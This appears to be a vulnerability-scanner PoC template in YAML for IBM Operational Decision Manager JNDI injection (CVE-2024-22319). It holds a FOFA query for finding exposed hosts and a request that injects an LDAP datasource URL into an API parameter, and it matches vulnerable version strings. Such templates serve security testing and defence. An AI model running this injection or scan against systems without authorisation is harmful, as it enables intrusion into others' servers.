id: poc-yaml-ibm-operational-decision-manager-jndi-injection
info:
  name: IBM Operational Decision Manager JNDI注入漏洞(CVE-2024-22319)
  severity: critical
  tags:
  - CVE-2024-22319
  - LDAP注入
  finger: IBM Operational Decision Manager
  fofa: title="IBM ODM"
requests:
- method: GET
  path: /decisioncenter-api/v1/about?datasource=ldap://127.0.0.1
  expression: (status_code == 200 && contains(headers,"application/json")) && ( contains(body,"\"version\":\"8.10.3\"")
    || contains(body,"\"version\":\"8.10.4\"") || contains(body,"\"version\":\"8.10.5.1\"")
    || contains(body,"\"version\":\"8.11.0.1\"") || contains(body,"\"version\":\"8.12.0.1\"")
    )
variables: {}
transport: http
